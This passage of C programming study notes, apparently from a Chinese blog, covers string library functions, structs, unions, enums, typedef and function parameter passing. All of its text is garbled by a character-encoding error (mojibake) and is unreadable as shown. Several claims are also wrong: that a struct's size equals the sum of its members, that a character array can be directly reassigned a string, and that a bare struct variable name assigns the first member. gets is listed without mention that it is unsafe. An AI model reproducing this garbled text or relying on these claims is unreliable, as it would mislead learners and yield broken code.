<p>ï¼ˆ3ï¼‰ä½¿ç”¨printfä¸scanfä¸¤ä¸ªå‡½æ•°æ—¶ï¼Œå¦‚æœå®šä¹‰ä¸º%cæ—¶ï¼Œåé¢è·Ÿçš„å¿…é¡»æ˜¯å¦‚a[n]è¿™èˆ¬çš„æŸä¸ªå…·ä½“çš„ä½ç½®ã€‚éœ€ä½¿ç”¨å¾ªç¯è¯­å¥è¿›è¡Œä¸€ä¸ªä¸€ä¸ªå­—ç¬¦è¿›è¡Œè¾“å…¥/è¾“å‡ºï¼Œè¾“å…¥æ—¶å€™å„ä¸ªå­—ç¬¦ä¸å¿…ç”¨ç©ºæ ¼éš”å¼€ï¼Œå› ä¸ºæ­¤æ—¶ç©ºæ ¼ä¹Ÿå°†è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå­—ç¬¦å­˜å‚¨åœ¨æ•°ç»„é‡Œï¼›å¹¶ä¸”å¦‚æœæ•°å€¼é•¿åº¦ä»å¤Ÿï¼ŒæŒ‰ä¸‹çš„å›è½¦é”®ä¹ŸåŒæ ·ä¼šè¢«å­˜å‚¨åœ¨æ•°ç»„ä¸­</p>
<p>â€‹        å¦ï¼šå¦‚æœä¸º%sï¼Œåé¢è·Ÿçš„å˜æˆå¦‚aè¿™èˆ¬çš„æ•°ç»„åï¼Œä½œä¸ºä¸€ä¸ªæ•´ä½“çš„åœ°å€ï¼Œæœ‰ä¸ªéœ€æ³¨æ„ï¼Œåœ¨è¾“å…¥å‡½æ•°scanfä¸­ä½¿ç”¨æ—¶ï¼Œè‹¥è¾“å…¥ç©ºæ ¼å°†ä¼šè¢«è®¤ä¸ºæ˜¯å·²ç»å®Œæˆäº†è¾“å…¥</p>
<p>ï¼ˆ4ï¼‰ä¸Šé¢çš„æ–¹æ³•å…¶å®è¿‡äºå¤æ‚ï¼Œè€Œå¯¹äºå«æœ‰å­—ç¬¦çš„æ•°ç»„ï¼Œåœ¨stringçš„å¤´æ–‡ä»¶ä¸­æœ‰ä¸“é—¨çš„ä¸€äº›å‡½æ•°å¯ä»¥å¸®å¿™å¤„ç†ï¼š</p>
<p>gets(å­—ç¬¦æ•°ç»„å)ï¼šè¾“å…¥çš„å­—ç¬¦ä¸²èµ‹å€¼ç»™å­—ç¬¦æ•°ç»„ï¼Œå¹¶ä¸”ç©ºæ ¼ä¸ä¼šè¢«è®¤ä¸ºæ˜¯ç»“æŸçš„æ ‡å¿—ï¼Œåªæœ‰å›è½¦æ‰æ˜¯ï¼Œæ‰€ä»¥å¯ä»¥è¾“å…¥å¤šä¸ªå­—ç¬¦ä¸²</p>
<p>puts(å­—ç¬¦æ•°ç»„å)ï¼šè¾“å‡ºå­—ç¬¦æ•°ç»„é‡Œçš„å†…å®¹</p>
<p>strcat(å­—ç¬¦æ•°ç»„1ï¼Œå­—ç¬¦æ•°ç»„2)ï¼šæŠŠå­—ç¬¦æ•°ç»„2çš„å†…å®¹ç›´æ¥æ”¾å…¥å­—ç¬¦æ•°ç»„1ä¸­å¹¶è¿æ¥åœ¨å…¶åé¢(å‰ææ˜¯å­—ç¬¦æ•°ç»„1çš„é•¿åº¦å¤Ÿå¤§)</p>
<p>strcpy(å­—ç¬¦æ•°ç»„1ï¼Œå­—ç¬¦æ•°ç»„2)ï¼šæŠŠå­—ç¬¦æ•°ç»„2çš„å†…å®¹ç›´æ¥å¤åˆ¶åˆ°å­—ç¬¦æ•°ç»„1ä¸­ï¼Œæ³¨æ„æ˜¯<strong>è¦†ç›–å¼</strong>çš„ï¼ˆå‰ææ˜¯å­—ç¬¦æ•°ç»„1çš„é•¿åº¦æ¯”2çš„å¤§æˆ–ç­‰ï¼‰</p>
<p>strcmp(å­—ç¬¦æ•°ç»„1ï¼Œå­—ç¬¦æ•°ç»„2)ï¼šæŠŠå­—ç¬¦æ•°ç»„1å’Œå­—ç¬¦æ•°ç»„2çš„å­—ç¬¦æŒ‰ç…§ä»å·¦å¾€å³çš„é¡ºåºè¿›è¡ŒASCIIç å€¼çš„æ¯”è¾ƒï¼Œç›´è‡³å‡ºç°ä¸åŒçš„å­—ç¬¦æˆ–è€…é‡åˆ°æœ«å°¾çš„â€™\0â€™åœæ­¢ï¼›è‹¥æ˜¯ä¸¤è€…ç›¸ç­‰ï¼Œåˆ™å‡½æ•°è¿”å›å€¼ä¸º<strong>0</strong>ï¼›è‹¥æ˜¯å‰è€…å¤§äºåè€…ï¼Œåˆ™å‡½æ•°è¿”å›å€¼ä¸º<strong>æ­£æ•´æ•°</strong>ï¼›è‹¥æ˜¯å‰è€…å°äºåè€…ï¼Œåˆ™å‡½æ•°è¿”å›å€¼ä¸º<strong>è´Ÿæ•´æ•°</strong>ï¼ˆç›¸æ¯”çš„ä¸ºåŒä½ç½®çš„å­—ç¬¦ï¼Œä¸€æ—¦æ¯”å‡ºç»“æœç«‹åˆ»åœæ­¢æ¯”è¾ƒï¼Œè¿”å›å‡½æ•°å€¼ï¼‰</p>
<p>strlen(å­—ç¬¦æ•°ç»„)ï¼šè®¡ç®—å­—ç¬¦æ•°ç»„ä¸­çš„å­—ç¬¦ä¸ªæ•°ã€‚ä¸åŒ…æ‹¬â€™\0â€™</p>
<p>strlwr(å­—ç¬¦æ•°ç»„)ï¼šæŠŠå­—ç¬¦æ•°ç»„ä¸­çš„å¤§å†™å­—ç¬¦è½¬æ¢ä¸ºå°å†™å­—ç¬¦</p>
<p>strupr(å­—ç¬¦æ•°ç»„)ï¼šæŠŠå­—ç¬¦æ•°ç»„ä¸­çš„å°å†™å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™å­—ç¬¦</p>
<p>12ã€å¾ªç¯ç»“æ„ä¸æ•°ç»„æ˜¯é»„é‡‘æ­æ¡£ï¼Œç»å¸¸é…åˆä½¿ç”¨</p>
<p>13ã€å®šä¹‰æ•°ç»„æ—¶é‡Œé¢çš„[ ]å¯ä»¥æ˜¯å­—æ¯ï¼Œä½†å¿…é¡»æ˜¯æŸä¸ªå…·æœ‰ç¡®å®šçš„å€¼çš„å­—æ¯ï¼Œæ€»ä¹‹å€¼ä¸€å®šå¾—æ˜¯ç¡®å®šçš„</p>
<p>14ã€å­—ç¬¦æ•°ç»„ç›´æ¥èµ‹å€¼ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œå¯ä»¥è¢«å¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆé•¿çŸ­ä¸ä¸€å®šè¦ä¸€è‡´ï¼‰ç›´æ¥è¦†ç›–ã€‚</p>
<p>15ã€å­—ç¬¦ä¸²çš„ä¸€ç»´æ•°ç»„åªèƒ½å­˜æ”¾ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€ŒäºŒç»´æ•°ç»„å¯ç”¨æ¥ç››æ”¾å¤šä¸ªå­—ç¬¦ä¸²ï¼ˆæ¯è¡Œå­˜æ”¾ä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰ï¼Œå…¶åˆ—è¡¨ç¤ºæ¯è¡Œæ‰€èƒ½å®¹çº³çš„æœ€å¤§çš„å­—ç¬¦ä¸ªæ•°ï¼ˆä¼šé€ æˆç©ºé—´æµªè´¹ï¼Œåé¢æœ‰æŒ‡é’ˆæ•°ç»„ï¼Œæ‰æ˜¯æ›´å¥½çš„é€‰æ‹©ï¼‰</p>
<h3 id="äºŒã€ç»“æ„ä½“"><a href="#äºŒã€ç»“æ„ä½“" class="headerlink" title="äºŒã€ç»“æ„ä½“"></a>äºŒã€ç»“æ„ä½“</h3><p>1ã€ç»“æ„ä½“ï¼ˆstructï¼‰ï¼šæŠŠè‹¥å¹²ä¸ªä¸åŒç±»å‹çš„å˜é‡ç»„åˆåˆ°ä¸€èµ·æ„æˆçš„çš„æ•°æ®ç±»å‹</p>
<p>2ã€å£°æ˜æ ¼å¼ï¼š**struct ç»“æ„ä½“å {æˆå‘˜}; **  ã€‚ï¼ˆå®šä¹‰çš„å†…å®¹ï¼Œå®šä¹‰æ–¹å¼ä¸å®šä¹‰å˜é‡ã€æ•°ç»„æ–¹å¼ä¸€è‡´ï¼‰</p>
<p>3ã€ç»“æ„ä½“ä¸­çš„å„ä¸ªéƒ¨åˆ†ç§°ä¸ºæˆå‘˜ï¼Œè€Œæˆå‘˜åå¯ä»¥ä¸ç»“æ„ä½“ä¹‹å¤–å®šä¹‰çš„å˜é‡åç›¸åŒï¼Œä½†ä¸èƒ½ä¸å…³é”®å­—åŒåã€‚</p>
<p>4ã€ï¼ˆè¦å…ˆå£°æ˜ï¼Œæ‰èƒ½æœ‰æ­¤æ­¥éª¤çš„å®šä¹‰ï¼‰ä½¿ç”¨ç»“æ„ä½“æ ¼å¼ä¸ºï¼š**struct ç»“æ„ä½“å å˜é‡å **ï¼Œè‹¥æ˜¯è¦åˆå§‹åŒ–ï¼Œåˆ™ç”¨{}æ‹¬èµ·æ¥ï¼Œé‡Œé¢çš„æ•°æ®ç±»å‹æŒ‰é¡ºåºä¸”ä¸ç»“æ„ä½“ä¸­çš„æˆå‘˜æ•°æ®ç±»å‹ç›¸åŒï¼Œå¦‚æœèµ‹å€¼æ•°æ®ä¸ªæ•°ä¸å¤Ÿï¼Œåˆ™å‰©ä½™è¡¥0ï¼›è¶…è¿‡åˆ™å‡ºé”™</p>
<p>5ã€ç»“æ„ä½“å°†å¼•å…¥â€œ.â€è¿™ä¸ªç¬¦å·è¿›è¡Œå¯¹æˆå‘˜èµ‹å€¼ï¼š<strong>å˜é‡å.æˆå‘˜å=ï¼Ÿ</strong>è¿›è¡Œèµ‹å€¼ï¼Œè‹¥æ˜¯å‡ºç°å¤šå±‚åµŒå¥—çš„ç»“æ„ä½“ï¼Œåˆ™é€šè¿‡å¤šä¸ª  <strong>.</strong>  è¿›è¡Œè¿æ¥ï¼Œç”±æœ€å¤–å±‚åˆ°æœ€å†…å±‚é€å±‚çš„æ’åº</p>
<p>6ã€ç›´æ¥ä½¿ç”¨å˜é‡åä»£è¡¨å¯¹ç»“æ„ä½“ä¸­ç¬¬ä¸€ä¸ªçš„æˆå‘˜è¿›è¡Œèµ‹å€¼ï¼Œè‹¥å¯¹ç‰¹å®šçš„æŸä¸ªæˆå‘˜èµ‹å€¼ï¼Œéœ€è¦ç”¨  <strong>.</strong></p>
<p>7ã€ä½¿ç”¨ç»“æ„ä½“å®šä¹‰çš„å˜é‡ï¼Œå°±æ‹¥æœ‰äº†ç»“æ„ä½“ä¸­çš„æˆå‘˜ä½œä¸ºè¯¥å˜é‡çš„å±æ€§ï¼Œé‚£äº›æˆå‘˜å¥½ä¼¼æˆä¸ºå˜é‡åå¤´ä¸‹çš„ä¸€ä¸ªä¸ªæ ‡ç­¾</p>
<p>8ã€ç»“æ„ä½“æ•°ç»„å°±æ˜¯æŠŠç»“æ„ä½“å®šä¹‰çš„å˜é‡çš„æ–¹å¼æ¢æˆäº†å»å®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œåœ¨å¤„ç†ä¸€äº›ç›¸åŒç±»å‹çš„æ•°æ®ä¸Šå¯ä»¥ç®€åŒ–ä»£ç ï¼Œå…¶ä½™å¹¶æ— å·®åˆ«</p>
<p>9ã€ä½æ®µï¼šåœ¨ä¸€ä¸ªç»“æ„ä½“ä¸­ä½¿ç”¨æŒ‡å®šé•¿åº¦çš„ä½ï¼ˆäºŒè¿›åˆ¶ä½ï¼‰ä½œä¸ºå•ä½çš„æˆå‘˜ï¼ˆå¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯ç”¨ä¸åˆ°çš„ï¼‰</p>
<p>æ ¼å¼ä¸ç»“æ„ä½“å®šä¹‰å‡ ä¹ä¸€è‡´ï¼Œå”¯ä¸€å·®åˆ«å°±æ˜¯åœ¨å®šä¹‰çš„æˆå‘˜åé¢åŠ ä¸Š   <strong>: ä½çš„ä¸ªæ•°</strong>ï¼Œå¦‚int num :8;</p>
<p>10ã€åŒä¸ªç»“æ„ä½“åå®šä¹‰ä¸‹çš„ä¸åŒå˜é‡å¯ä»¥ç›´æ¥ä½¿ç”¨èµ‹å€¼è¯­å¥ç”¨äºå€¼çš„äº¤æ¢</p>
<p>11ã€ç»“æ„ä½“å˜é‡æ‰€å å­˜å‚¨ç©ºé—´çš„å¤§å°ç­‰äºå„ä¸ªæˆå‘˜çš„å­˜å‚¨ç©ºé—´ä¹‹å’Œ</p>
<p>12ã€ç»“æ„ä½“è¿ç”¨åœ¨æŸä¸ªå˜é‡æ‹¥æœ‰å¤šç§æ–¹é¢çš„æ•°æ®ç±»å‹</p>
<h3 id="ä¸‰ã€å…±ç”¨ä½“"><a href="#ä¸‰ã€å…±ç”¨ä½“" class="headerlink" title="ä¸‰ã€å…±ç”¨ä½“"></a>ä¸‰ã€å…±ç”¨ä½“</h3><p>1ã€å…±ç”¨ä½“ï¼ˆunionï¼‰ï¼šå¤šä¸ªä¸åŒç±»å‹æ•°æ®å…±äº«ç©ºé—´çš„æ„é€ ç±»å‹ã€‚åœ¨å…¶é‡Œé¢çš„æˆå‘˜<em><strong>å…±ç”¨ä¸€ä¸ªå­˜å‚¨ç©ºé—´</strong></em>ï¼Œéƒ½æ˜¯ä»ç›¸åŒçš„ç‰©ç†åœ°å€å¼€å§‹</p>
<p>2ã€ç”¨æ³•ä¸ç»“æ„ä½“ä¸€è‡´ï¼Œå¯å‚è€ƒç»“æ„ä½“çš„åšæ³•ï¼Œç›´æ¥æ¨¡ä»¿</p>
<p>3ã€å…±ç”¨ä½“ä¸­å…è®¸åµŒå¥—ã€‚å³ï¼šé‡Œé¢çš„æˆå‘˜å¯ä»¥æ˜¯æ•°ç»„ï¼ŒæŒ‡é’ˆï¼Œç»“æ„ä½“å’Œå…±ç”¨ä½“ï¼ˆç»“æ„ä½“ä¹Ÿæ˜¯å¦‚æ­¤ï¼‰</p>
<p>4ã€å…±ç”¨ä½“å˜é‡æ‰€å çš„ç©ºé—´å¤§å°å–å†³äºå å­˜å‚¨ç©ºé—´æœ€å¤§çš„é‚£ä¸ªæˆå‘˜ï¼Œä¸ç»“æ„ä½“è¦åŒºåˆ†å¼€ï¼</p>
<p>5ã€åœ¨å…±ç”¨ä½“åˆå§‹åŒ–æ—¶åªèƒ½å¯¹ç¬¬ä¸€ä¸ªæˆå‘˜çš„å€¼è¿›è¡Œåˆå§‹åŒ–</p>
<p>6ã€å…±ç”¨ä½“ä¸­çš„æˆå‘˜åªèƒ½æœ‰ä¸€ä¸ªæˆå‘˜æœ‰å€¼ï¼Œå› ä¸ºä¸€æ—¦å¯¹æŸä¸ªæˆå‘˜èµ‹å€¼ï¼Œå°±ä¼šè¦†ç›–å…¶ä»–æˆå‘˜åŸæ¥çš„æ•°æ®ï¼Œå› æ­¤æœ€åä¸€æ¬¡èµ‹å€¼æ˜¯å…±ç”¨ä½“èµ·ä½œç”¨çš„æ•°å€¼</p>
<p>7ã€å½“å…±ç”¨ä½“é‡Œé¢åµŒå¥—ç»“æ„ä½“æ—¶ï¼Œç»“æ„ä½“çš„æˆå‘˜å…±ç”¨å…±ç”¨ä½“é‡Œçš„ç©ºé—´ï¼Œåˆ†é…é¡ºåºé»˜è®¤ä¸ºä»ä½åœ°å€åˆ°é«˜åœ°å€</p>
<p>8ã€è¿ç”¨åœ¨æŸä¸ªæ•°æ®å¯èƒ½ç”¨çš„ç±»å‹æœ‰å¤šç§ï¼Œè€Œè¿›è¡Œé€‰æ‹©</p>
<h3 id="å››ã€æšä¸¾ç±»å‹"><a href="#å››ã€æšä¸¾ç±»å‹" class="headerlink" title="å››ã€æšä¸¾ç±»å‹"></a>å››ã€æšä¸¾ç±»å‹</h3><p>1ã€æšä¸¾ï¼šæŠŠå˜é‡æ‰€æœ‰å¯èƒ½å–å€¼ä¸€ä¸€ç½—åˆ—å‡ºæ¥ï¼Œå¢åŠ ç¨‹åºçš„å¯è¯»æ€§</p>
<p>2ã€å£°æ˜æ ¼å¼ï¼š**enum æšä¸¾å ï½›æšä¸¾å€¼ï½;**ï¼ˆæšä¸¾å€¼å¯ä¸ºå­—ç¬¦ä¸²ï¼ˆä¸è¦åŠ åŒå¼•å·ï¼‰ï¼Œå°†ä¼šè¢«ç³»ç»Ÿä½œä¸ºæ•´å‹å¸¸é‡å¤„ç†ï¼›ä¸åŒçš„æšä¸¾å€¼ä¹‹é—´ç”¨â€™ , â€˜éš”å¼€ï¼‰</p>
<p>3ã€æšä¸¾å€¼æ— ç‰¹å®šçš„èµ‹å€¼åºå·æ—¶ï¼Œåˆ™ä»0å¼€å§‹é€ä¸ªåŠ 1é€’å¢ç»™äºˆåºå·ï¼›å¦å¤–å¯¹æŸä¸€æšä¸¾å…ƒç´ èµ‹å€¼åºå·ï¼Œè€Œå…¶åæ— èµ‹å€¼åºå·ï¼Œåˆ™ä»è¯¥åºå·å¼€å§‹åŠ 1é€’å¢</p>
<p>4ã€å¯ä»¥é€šè¿‡ä½¿ç”¨switchï¼ˆæšä¸¾å€¼çš„åºå·ï¼‰ï½›ï½è¯­å¥æ¥å¯¹æšä¸¾å˜é‡è¿›è¡Œè¾“å…¥å’Œè¾“å‡º</p>
<p>5ã€æšä¸¾ç±»å‹å®šä¹‰é‡Œé¢çš„æšä¸¾å…ƒç´ ï¼Œå¥½åƒä¸€ä¸ªä¸ªå­˜å‚¨ç€çš„å€¼ï¼Œæ˜¯éœ€è¦ç»è¿‡é€‰æ‹©ç„¶åå†å°†å…¶èµ‹å€¼ç»™å˜é‡ï¼Œå˜é‡æ‰èƒ½å…·æœ‰é‚£ä¸ªæšä¸¾å€¼ï¼Œä¸èƒ½ä½¿ç”¨æšä¸¾å€¼çš„åºå·è¿›è¡Œèµ‹å€¼ï¼Œå¿…é¡»è¾“å…¥å…¨åï¼›è‹¥æ˜¯è¦ç”¨åºå·èµ‹å€¼ï¼Œéœ€è¦çš„æ ¼å¼ä¸ºï¼š<strong>ï¼ˆenum æšä¸¾åï¼‰ï¼ˆæŸåºå·ï¼‰</strong></p>
<p>6ã€æšä¸¾å€¼çš„åºå·å¯ç”¨æ¥æ¯”å¤§å°ï¼Œä½œä¸ºåˆ¤æ–­æ¡ä»¶</p>
<p>7ã€ç”¨æŸç±»å‹çš„ä¸€ä¸ªæšä¸¾å˜é‡ä¸ºå¦ä¸€ä¸ªè¯¥ç±»å‹æšä¸¾å˜é‡èµ‹ä¸Šæšä¸¾å€¼ï¼ša=(enum) æšä¸¾å (b+1)ï¼ˆaï¼Œbä¸ºåŒç±»å‹æšä¸¾å˜é‡ï¼Œb+1è¡¨ç¤ºä¸€ä¸ªæ ‡é‡çš„åºå·ï¼ŒåŠ 1åªæ˜¯ä¸¾ä¾‹ï¼Œå¯ä»¥è¿›è¡Œå…¶ä»–è¿ç®—ï¼‰</p>
<h3 id="äº”ã€è‡ªå®šä¹‰ç±»å‹å"><a href="#äº”ã€è‡ªå®šä¹‰ç±»å‹å" class="headerlink" title="äº”ã€è‡ªå®šä¹‰ç±»å‹å"></a>äº”ã€è‡ªå®šä¹‰ç±»å‹å</h3><p>1ã€è‡ªå®šä¹‰ç±»å‹ï¼šä½¿ç”¨typedefå£°æ˜ä¸€ç§æ–°çš„ç±»å‹åæ¥ä»£æ›¿å·²æœ‰çš„æŸç±»å‹å</p>
<p>2ã€è¯­æ³•æ ¼å¼ï¼š<strong>typedef æŸç±»å‹å æ–°ç±»å‹å</strong> ï¼ˆæ–°ç±»å‹åä¹ æƒ¯ä¸Šç”¨å¤§å†™å­—æ¯è¡¨ç¤ºï¼Œä»¥ä¾¿ä¸å·²æœ‰çš„è¿›è¡ŒåŒºåˆ†ï¼‰</p>
<p>3ã€æŸç±»å‹åå¯ä»¥æ˜¯floatï¼Œintè¿™ç±»æ ‡å‡†æ•°æ®ç±»å‹ï¼›ä¹Ÿå¯ä»¥æ˜¯ç»“æ„ä½“ï¼Œå…±ç”¨ä½“ï¼Œæšä¸¾ï¼›</p>
<p>4ã€è¿™ä¸ªå…³é”®å­—çš„ç”¨æ³•ç±»ä¼¼ä¸€ç§æ ¼å¼åˆ·çš„æ„Ÿè§‰ï¼Œå¯ä»¥å°†ä½ â€œåˆ·â€è¿‡çš„ç±»å‹å»æŠŠåˆ«çš„å˜é‡çš„ç±»å‹å˜å¾—ä¸€è‡´</p>
<h1 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h1><h3 id="ä¸€ã€å‡½æ•°æ¦‚è¿°ã€è‡ªå®šä¹‰ã€è°ƒç”¨"><a href="#ä¸€ã€å‡½æ•°æ¦‚è¿°ã€è‡ªå®šä¹‰ã€è°ƒç”¨" class="headerlink" title="ä¸€ã€å‡½æ•°æ¦‚è¿°ã€è‡ªå®šä¹‰ã€è°ƒç”¨"></a>ä¸€ã€å‡½æ•°æ¦‚è¿°ã€è‡ªå®šä¹‰ã€è°ƒç”¨</h3><p>1ã€å‡½æ•°ï¼šæ˜¯å¯¹æ•°æ®è¿›è¡Œä¸€ç³»åˆ—çš„æ“ä½œï¼Œè€Œå»å®ŒæˆæŸä¸ªç‰¹å®šåŠŸèƒ½çš„è¿‡ç¨‹ã€‚å¥½ä¼¼ä¸€ç§å…¬å¼ï¼ŒæŠŠæ•°æ®å¥—è¿›å»ä¸€æ ·</p>
<p>2ã€å‡½æ•°åˆ†ä¸ºç³»ç»Ÿåº“å‡½æ•°ä¸ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œå‰è€…ç”±ç¼–è¯‘ç³»ç»Ÿæä¾›ï¼Œç”¨æˆ·è¾“å…¥å¤´æ–‡ä»¶ä¾¿å¯ä»¥è°ƒç”¨ï¼›è€Œåè€…æ˜¯ç¨‹åºå‘˜è‡ªè¡Œå®šä¹‰ä¸è®¾è®¡ï¼Œç”¨æ¥å®ŒæˆæŸé¡¹ç‰¹å®šçš„åŠŸèƒ½ã€‚</p>
<p>3ã€è‡ªå®šä¹‰å‡½æ•°æ ¼å¼ï¼š<strong>ç±»å‹æ ‡è¯†ç¬¦ å‡½æ•°å (å½¢å¼å‚æ•°è¡¨){å‡½æ•°ä½“ï¼ˆå³ï¼šæŸç§è¿ç®—è¿‡ç¨‹ï¼‰}</strong></p>
<p><strong>æ³¨ï¼šç±»å‹æ ‡è¯†ç¬¦æ˜¯æ‰§è¡Œå®Œè¯¥å‡½æ•°ç¨‹åºï¼Œæ•°æ®è¿”å›çš„ç±»å‹å®šä¹‰ï¼›å‡½æ•°åä¸å¯ä»¥ä¸å…³é”®å­—é‡åï¼Œåœ¨æ•´ä¸ªç¨‹åºä¸­æ˜¯å”¯ä¸€çš„ï¼›ï½›ï½åé¢æ— â€ ; â€œ    å‡½æ•°å®šä¹‰ä¸­ä¸èƒ½å†å®šä¹‰ä¸€ä¸ªæ–°å‡½æ•°ï¼›å½¢å‚å®šä¹‰æ ¼å¼ä¾‹å¦‚ int aï¼Œint bï¼ŒÂ·Â·Â·Â·Â·Â·</strong></p>
<p>4ã€å½¢å‚ç±»ä¼¼ä¸€ä¸ªå…¬å¼é‡Œé¢çš„xï¼Œyï¼Œåœ¨ä½¿ç”¨å‡½æ•°æ—¶ï¼Œæ ¼å¼åº”æŒ‰ç…§å½¢å‚çš„æ ·å¼è¿›è¡Œè°ƒç”¨ï¼›è°ƒç”¨æ—¶ä¾¿æŠŠå€¼èµ‹äºˆå½¢å‚è¿›è¡Œè¿ç®—ç„¶ååœ¨è¿”å›å‡ºå»éœ€è¦çš„å€¼ã€‚ï¼ˆä¸¤è€…ä¸ªæ•°å¿…é¡»ç›¸ç­‰ï¼‰</p>
<p>5ã€return è¡¨è¾¾å¼æˆ–return ï¼ˆè¡¨è¾¾å¼ï¼‰è¿”å›å‡½æ•°å€¼ï¼Œä¸å†™æ—¶ï¼Œå‡½æ•°è¿”å›ç±»å‹åº”è¯¥ä¸ºvoidï¼›å†™å…¥æ—¶ï¼Œç»“æŸå‡½æ•°ä½“çš„æ‰§è¡Œï¼Œç¨‹åºå›åˆ°è°ƒç”¨è¯¥å‡½æ•°çš„åœ°æ–¹ï¼Œå¹¶æŠŠå…¶åè¡¨è¾¾å¼çš„å€¼æŒ‰ç…§ç±»å‹æ ‡è¯†ç¬¦çš„æ•°æ®ç±»å‹è¿”å›ç»™ä¸»è°ƒå‡½æ•°ï¼ˆä¹Ÿå°±æ˜¯æŠŠå€¼è¾“å‡ºï¼‰</p>
<p>6ã€è·Ÿåœ¨returnåçš„è¡¨è¾¾å¼è¿”å›å€¼çš„æ•°æ®ç±»å‹å¿…é¡»è·Ÿå®šä¹‰å‡½æ•°æ—¶çš„æ•°æ®ç±»å‹ä¸€è‡´ï¼Œä¸ä¸€è‡´æ—¶å°†ä»¥å®šä¹‰å‡½æ•°æ—¶çš„æ•°æ®ç±»å‹ä¸ºå‡†ï¼Œè¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢</p>
<p>7ã€å½“å®šä¹‰å‡½æ•°æ—¶çœç•¥è¿”å›å€¼çš„æ•°æ®ç±»å‹å®šä¹‰ï¼Œç³»ç»Ÿå°†é»˜è®¤ä¸ºintå‹</p>
<p>8ã€ å½“æŠŠè‡ªå®šä¹‰å‡½æ•°çš„å®šä¹‰è¯­å¥å†™åˆ°ä¸»è°ƒå‡½æ•°çš„åé¢æ—¶ï¼Œåœ¨ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°å‰éœ€è¦åŠ ä¸Šè‡ªå®šä¹‰å‡½æ•°çš„å£°æ˜ï¼ˆæ ¼å¼ä¸ºï¼š ç±»å‹æ ‡è¯†ç¬¦ å‡½æ•°å ï¼ˆç±»å‹ å½¢å‚1ï¼Œç±»å‹ å½¢å‚2ï¼Œï¼‰æˆ–è€…ï¼ˆç±»å‹ï¼Œç±»å‹Â·Â·Â·ï¼‰ï¼‰ï¼›è‹¥æ˜¯å‡½æ•°å®šä¹‰å†™åœ¨ä¸»è°ƒå‡½æ•°ä¹‹å‰åˆ™ä¸å¿…å†™å£°æ˜</p>
<p>9ã€å‡½æ•°å®šä¹‰ä¸­ä¸èƒ½åµŒå¥—å‡½æ•°ï¼Œä½†æ˜¯è°ƒç”¨å‡½æ•°äº§ç”Ÿçš„å€¼å´å¯ä»¥å†å¥—åœ¨å‡½æ•°é‡Œé¢ï¼Œå¦‚ï¼šmin(min(a,b),min(c,d)) è®¡ç®—å‡ºa,b,c,då››ä¸ªé‡Œé¢çš„æœ€å°å€¼</p>
<p>10ã€å‡½æ•°é‡Œé¢è‹¥åŒ…å«è¾“å‡ºè¯­å¥ï¼ˆprintfï¼Œputsç­‰ï¼‰ï¼Œåœ¨è°ƒç”¨æ—¶æ˜¯ä¼šè¾“å‡ºé‡Œé¢çš„è¯­å¥</p>
<h3 id="äºŒã€å‡½æ•°çš„å‚æ•°ä¼ é€’"><a href="#äºŒã€å‡½æ•°çš„å‚æ•°ä¼ é€’" class="headerlink" title="äºŒã€å‡½æ•°çš„å‚æ•°ä¼ é€’"></a>äºŒã€å‡½æ•°çš„å‚æ•°ä¼ é€’</h3><h4 id="å€¼ä¼ é€’"><a href="#å€¼ä¼ é€’" class="headerlink" title="å€¼ä¼ é€’"></a>å€¼ä¼ é€’</h4><p>1ã€å€¼ä¼ é€’ï¼šè°ƒç”¨å‡½æ•°æ—¶ï¼Œä¸»è°ƒå‡½æ•°æŠŠå®å‚çš„å€¼èµ‹å€¼ç»™å½¢å‚ã€‚</p>
<p>2ã€å½¢å‚çš„å€¼å˜åŒ–ä¸ä¼šå½±å“å®å‚çš„å€¼ï¼Œå½¢å‚ä¸€èˆ¬ä¸ºå˜é‡ï¼Œå®å‚å¯ä»¥æ˜¯å˜é‡ã€å¸¸é‡ã€è¡¨è¾¾å¼</p>
<h4 id="åœ°å€ä¼ é€’"><a href="#åœ°å€ä¼ é€’" class="headerlink" title="åœ°å€ä¼ é€’"></a>åœ°å€ä¼ é€’</h4><p>1ã€åœ°å€ä¼ é€’ï¼šä¸»è°ƒå‡½æ•°æŠŠå®å‚çš„åœ°å€ä¼ é€’ç»™å½¢å‚ï¼Œä½œä¸ºå½¢å‚çš„åœ°å€</p>
<p>2ã€å½“è¿›è¡Œçš„ä¸ºåœ°å€ä¼ é€’æ—¶ï¼Œå½¢å‚å’Œå®å‚å…±ç”¨ä¸€ä¸ªåœ°å€ï¼Œå…±ç”¨ä¸€ä¸ªå­˜å‚¨ç©ºé—´ï¼Œå³å½¢å‚çš„æ”¹å˜å°±æ˜¯å®å‚çš„æ”¹å˜</p>
<p>3ã€è¡¨ç¤ºåœ°å€ä¼ é€’çš„æœ‰<strong>æ•°ç»„åã€&amp;å˜é‡ã€å­—ç¬¦ä¸²ã€æŒ‡é’ˆå˜é‡</strong></p>
<p>4ã€å½“å®å‚æ˜¯äºŒç»´æ•°ç»„ï¼Œå½¢å‚å¯ä»¥æ˜¯ä¸€ç»´æ•°ç»„ï¼Œæ­¤æ—¶ä¸èƒ½ç›´æ¥å°†å®å‚æ•°ç»„åå¡«å…¥æ‹¬å·å†…ï¼Œç±»å‹å°†ä¸åŒ¹é…ï¼›åº”å¡«å…¥ï¼šæ•°ç»„å [0] ï¼Œåœ¨æ­¤æ—¶ä½œä¸ºä¸€ä¸ªèµ·å§‹åœ°å€è½¬å˜ä¸ºä¸€ç»´æ•°ç»„çš„æ’åˆ—æ–¹å¼ã€‚äºŒç»´æ•°ç»„å…³ç³»å¦‚a[i] [j]=b[i*n+j]ï¼ˆiï¼Œjä¸ºåŒå±‚å¾ªç¯çš„å¾ªç¯æ•°ï¼Œnä¸ºäºŒç»´æ•°ç»„açš„åˆ—æ•°ï¼‰</p>
